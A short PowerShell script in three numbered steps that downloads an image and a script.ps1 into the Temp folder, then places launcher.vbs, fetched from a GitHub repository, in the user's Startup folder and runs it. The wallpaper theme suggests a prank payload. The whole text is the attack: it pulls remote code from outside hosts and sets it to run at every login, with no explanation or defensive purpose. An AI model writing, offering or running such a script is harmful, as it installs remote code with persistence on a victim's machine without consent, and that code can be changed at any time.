#1
Set-Location $env:Temp
Invoke-WebRequest https://w.forfun.com/fetch/9f/9f6e10f93c578b57172b33a9b0545594.jpeg -O Anime.jpg

#2
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/script.ps1 -O script.ps1

#3
Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
.\launcher.vbs